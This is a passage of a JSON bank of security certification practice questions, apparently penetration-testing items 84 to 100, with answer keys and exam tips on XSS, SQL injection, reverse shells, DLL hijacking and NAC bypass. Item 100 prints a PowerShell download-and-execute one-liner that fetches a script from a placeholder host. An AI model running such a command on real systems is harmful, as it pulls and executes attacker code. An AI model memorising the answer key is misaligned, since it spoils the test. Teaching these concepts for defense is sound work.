                "To identify, analyze, and prioritize potential security threats and vulnerabilities *early* in the software development lifecycle, allowing for proactive mitigation.",
                "To write a report about the security of a web application.",
                "To install security software on a web server."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Threat modeling is a proactive security analysis process, aiming to identify and address potential weaknesses *before* they can be exploited. It's not about exploiting vulnerabilities directly (that's penetration testing), writing reports (which is a separate step), or installing software.",
            "examTip": "Threat modeling = Proactive security analysis and risk mitigation."
        },
        {
            "id": 85,
            "question": "Which of the following is a common technique for performing a 'distributed denial-of-service' (DDoS) attack?",
            "options":[
               "Sending phishing emails to a large number of recipients.",
               "Using a botnet (a network of compromised computers, often infected with malware) to flood a target system or network with traffic from multiple sources simultaneously, overwhelming its resources.",
               "Exploiting a vulnerability in a web application to inject malicious SQL code.",
               "Cracking passwords using a brute-force or dictionary attack."
            ],
            "correctAnswerIndex": 1,
            "explanation": "DDoS attacks leverage *multiple* compromised systems (a botnet) to amplify the attack and make it more difficult to mitigate. Phishing is a social engineering technique, SQL injection targets databases, and brute-force/dictionary attacks target passwords.",
            "examTip": "DDoS = Distributed attack using a botnet."
        },
        {
           "id": 86,
            "question": "What is the primary purpose of using 'prepared statements' (parameterized queries) when interacting with a database from a web application?",
            "options":[
                "To make database queries execute faster.",
                "To prevent SQL injection vulnerabilities by separating SQL code from user-supplied data, treating user input as data rather than executable code.",
                "To encrypt data stored in the database.",
                "To improve the visual appearance of database query results."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Prepared statements are the most robust defense against SQL injection. They ensure that user input is treated as *data*, not as part of the SQL command itself. While they *can* sometimes improve performance, their primary purpose is security. They don't encrypt data or change the appearance of results.",
            "examTip": "Prepared statements (parameterized queries) = Prevent SQL injection."
        },
        {
            "id": 87,
           "question": "Which of the following is a common technique for discovering and exploiting vulnerabilities in web applications?",
           "options":[
               "Shoulder surfing.",
              "Using automated web application vulnerability scanners (like Burp Suite, OWASP ZAP, Nikto) in conjunction with manual testing, code review (if possible), and analysis of the application's logic and behavior.",
              "Phishing.",
              "Social engineering."
           ],
           "correctAnswerIndex": 1,
           "explanation": "Automated scanners and manual testing, including code review (when available), provide a comprehensive approach to finding web application vulnerabilities. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
           "examTip": "Automated scanners + manual testing + code review = Web application vulnerability discovery."
        },
         {
            "id": 88,
            "question": "What is a common method for performing a 'man-in-the-middle' (MitM) attack on a wireless network?",
            "options":[
              "SQL Injection",
              "Creating a rogue access point (evil twin) that mimics a legitimate network, tricking users into connecting to it and intercepting their traffic.",
              "Cross-site scripting",
              "Phishing"
            ],
            "correctAnswerIndex": 1,
            "explanation": "An evil twin attack involves setting up a fake Wi-Fi access point with the same or a similar SSID as a legitimate network. Users unknowingly connect to the attacker's AP, allowing the attacker to intercept, monitor, and potentially modify their traffic. SQL injection targets databases, XSS targets web applications, and phishing uses deception.",
            "examTip": "Evil twin = Rogue AP for MitM on Wi-Fi."
        },
        {
            "id": 89,
            "question": "You are performing a penetration test and discover that a web application is vulnerable to Cross-Site Scripting (XSS). What is the MOST likely impact of this vulnerability?",
            "options":[
                "An attacker can gain access to the web server's file system.",
                "An attacker can inject malicious scripts into web pages viewed by other users, potentially stealing cookies, redirecting users to malicious sites, defacing the website, or performing other client-side attacks.",
                "An attacker can force the user to perform unintended actions on the web application.",
                "An attacker can gain access to the web server's database."
            ],
            "correctAnswerIndex": 1,
            "explanation": "XSS involves injecting *client-side* scripts that are executed in the browsers of other users. This can lead to various consequences, including cookie theft, redirection, and defacement. Gaining file system access is more characteristic of other vulnerabilities (like file inclusion). Forcing unintended actions is CSRF. While database access *might* be a *consequence* of XSS (e.g., by stealing session cookies), it's not the primary and direct impact.",
            "examTip": "XSS = Injecting malicious scripts into web pages (client-side)."
        },
        {
          "id": 90,
          "question": "Examine the following `tcpdump` command:\n```bash\ntcpdump -i eth0 -w capture.pcap 'port 80 or port 443' and host 192.168.1.100\n```\nWhat traffic will this command capture and save to the `capture.pcap` file?",
          "options":[
            "All network traffic on the `eth0` interface.",
            "Only HTTP traffic (port 80) to or from any host.",
            "Only traffic to or from the host with IP address 192.168.1.100, on either port 80 (HTTP) or port 443 (HTTPS), on the `eth0` interface.",
            "Only HTTPS traffic (port 443) to or from any host."
          ],
          "correctAnswerIndex": 2,
          "explanation": "This `tcpdump` command uses several filters: `-i eth0` specifies the interface to listen on. `-w capture.pcap` specifies the output file. `'port 80 or port 443'` filters for traffic on either HTTP (80) or HTTPS (443) ports. `and host 192.168.1.100` further filters for traffic to or from that specific IP address.  It's not capturing *all* traffic, only HTTP/HTTPS, or only traffic to/from any host.",
          "examTip": "`tcpdump` filters = Isolate specific network traffic."
        },
        {
            "id": 91,
            "question": "What is 'session riding'?",
            "options":[
              "A type of denial-of-service attack.",
              "Another term for Cross-Site Request Forgery (CSRF).",
              "A method for encrypting web traffic.",
              "A type of password cracking technique."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Session riding and Cross-Site Request Forgery (CSRF) are synonymous terms for the same type of attack, where an attacker forces an authenticated user to perform unintended actions on a web application.",
            "examTip": "Session riding = CSRF."
        },
         {
           "id": 92,
           "question": "Which of the following is a common technique used to identify the version of a web server and its underlying technologies?",
           "options":[
               "Shoulder surfing.",
              "Examining HTTP response headers (e.g., 'Server', 'X-Powered-By'), using tools like Wappalyzer, BuiltWith, or WhatWeb, and analyzing error messages and default pages.",
              "Phishing.",
              "Social engineering."
           ],
           "correctAnswerIndex": 1,
           "explanation": "HTTP response headers, specialized tools, and analyzing default content/error messages can reveal information about the web server software and version. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
           "examTip": "HTTP headers, specialized tools, error messages = Identifying web server version and technologies."
        },
        {
            "id": 93,
           "question": "What is the primary purpose of using 'prepared statements' (parameterized queries) when interacting with databases from a web application?",
           "options":[
               "To make database queries execute faster.",
               "To prevent SQL injection vulnerabilities by separating SQL code from user-supplied data, ensuring that user input is treated as data and not as executable code.",
               "To encrypt data stored in the database.",
               "To improve the visual appearance of database query results."
           ],
           "correctAnswerIndex": 1,
           "explanation": "Prepared statements are the most robust defense against SQL injection. They ensure that user input is treated as *data*, not as part of the SQL command itself. While they *can* sometimes improve performance, their primary purpose is security. They don't encrypt data or change the appearance of results.",
           "examTip": "Prepared statements (parameterized queries) = Prevent SQL injection."
        },
        {
           "id": 94,
            "question": "Which of the following is a common method for an attacker to gain a 'reverse shell' from a compromised system?",
            "options":[
              "Using the `ls` command.",
              "Using Netcat (`nc`), Socat, or scripting languages (Python, Perl, etc.) to create an outbound connection *from* the target system *back* to the attacker's machine.",
              "Using the `cd` command.",
              "Using the `mkdir` command."
            ],
            "correctAnswerIndex": 1,
            "explanation": "A reverse shell involves the *target* connecting *back* to the attacker, often to bypass firewall restrictions that might block incoming connections. Netcat, Socat, and scripting languages are commonly used to establish reverse shells. `ls`, `cd`, and `mkdir` are standard Linux commands, not for creating reverse shells.",
            "examTip": "Reverse shell = Target connects *back* to attacker (Netcat, Socat, Python)."
        },
        {
            "id": 95,
            "question": "What is 'DLL hijacking'?",
            "options":[
                "A type of social engineering attack.",
                "An attack where a malicious DLL (Dynamic Link Library) file is placed in a location where it will be loaded by a legitimate application *instead of* the intended DLL, allowing the attacker's code to execute with the privileges of that application.",
                "A method for encrypting data stored on a hard drive.",
                "A way to improve system performance."
            ],
            "correctAnswerIndex": 1,
            "explanation": "DLL hijacking exploits the way Windows applications load DLLs, often by manipulating the DLL search order. By placing a malicious DLL in a specific location, the attacker can trick a legitimate application into loading and executing their code. It's not a social engineering attack, an encryption method, or a performance improvement technique.",
            "examTip": "DLL hijacking = Tricking an application into loading a malicious DLL."
        },
         {
          "id": 96,
           "question": "Which of the following is a common technique used to bypass Network Access Control (NAC) systems?",
           "options":[
            "Using strong passwords for all user accounts.",
            "MAC spoofing, 802.1X authentication bypass (if vulnerabilities exist), exploiting vulnerabilities in the NAC system itself, or using a VPN to tunnel traffic around the NAC.",
            "Enabling two-factor authentication for all user accounts.",
            "Regularly updating software on all network devices."
           ],
           "correctAnswerIndex": 1,
           "explanation": "MAC spoofing (changing a device's MAC address to match an authorized one), 802.1X bypass (if vulnerabilities exist), directly attacking the NAC system, or using a VPN to circumvent it are all methods for bypassing NAC. Strong passwords, 2FA, and updates are good security practices, but don't directly address NAC bypass.",
           "examTip": "MAC spoofing, 802.1X bypass, NAC exploits, VPN tunneling = Bypassing NAC."
        },
        {
            "id": 97,
            "question":"You are performing a penetration test and discover a web application that is vulnerable to Cross-Site Scripting (XSS). What is the MOST likely impact of this vulnerability?",
            "options":[
               "An attacker can gain direct access to the web server's file system.",
               "An attacker can inject malicious client-side scripts (typically JavaScript) into web pages viewed by other users, potentially stealing cookies, redirecting users to malicious sites, defacing the website, or performing other actions in the context of the victim's browser.",
               "An attacker can force a user to perform unintended actions on the web application.",
               "An attacker can directly access the web server's database."
            ],
            "correctAnswerIndex": 1,
            "explanation": "XSS is primarily about injecting *client-side* scripts that are executed in the browsers of other users.  While gaining file system access or database access *might* be *indirect* consequences of XSS (e.g., through stealing session cookies), they are not the defining characteristic.  Forcing unintended actions is CSRF.",
            "examTip": "XSS = Injecting client-side scripts into web pages."
        },
        {
            "id": 98,
            "question": "What is the primary purpose of 'output encoding' in web application security?",
            "options":[
               "To make web pages load faster.",
                "To prevent cross-site scripting (XSS) by converting special characters (like <, >, &, \", ') into their corresponding HTML entities (or appropriate encoding for the context, such as JavaScript encoding or URL encoding).",
                "To encrypt user passwords before storing them in a database.",
                "To improve the visual design and user interface of a website."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Output encoding is a crucial defense against XSS. It ensures that user-supplied data is treated as *data*, not as executable code, by the browser. It's not primarily about website speed, password encryption, or visual design.",
            "examTip": "Output encoding = Preventing XSS by sanitizing output (converting special characters)."
        },
         {
            "id": 99,
           "question":"Which of the following is a common technique used for performing 'SQL injection' attacks?",
           "options":[
                "Sending phishing emails to users to trick them into revealing their credentials.",
                "Injecting malicious SQL code into input fields of a web application (or other application that interacts with a database) that are not properly sanitized or validated, allowing the attacker to manipulate database queries.",
                "Scanning a network for open ports and services.",
                "Cracking passwords using a brute-force or dictionary attack."
           ],
           "correctAnswerIndex": 1,
           "explanation": "SQL injection specifically targets vulnerabilities in how applications handle user input when constructing database queries. Phishing is a social engineering technique, port scanning is reconnaissance, and brute-force/dictionary attacks target passwords.",
           "examTip": "SQL injection = Injecting malicious SQL code into input fields."
        },
        {
           "id": 100,
            "question": "Examine the following command, often used in post-exploitation on a Windows system:\n```powershell\nIEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')\n```\nWhat is this command doing?",
            "options":[
               "Displaying the contents of a local file.",
               "Downloading and executing a PowerShell script (`malicious.ps1`) from a remote URL (`http://example.com/malicious.ps1`).",
               "Scanning the local system for vulnerabilities.",
               "Encrypting files on the local system."
            ],
            "correctAnswerIndex": 1,
            "explanation": "This PowerShell command uses `New-Object Net.WebClient` to create a web client object, then uses its `DownloadString` method to download the contents of the specified URL (`http://example.com/malicious.ps1`).  `IEX` (Invoke-Expression) then executes the downloaded content as a PowerShell script. This is a common technique for downloading and running malicious code. It's not displaying local files, scanning for vulnerabilities, or encrypting files.",
            "examTip": "PowerShell `IEX (New-Object Net.WebClient).DownloadString` = Download and execute remote code."
        }
  ]
}
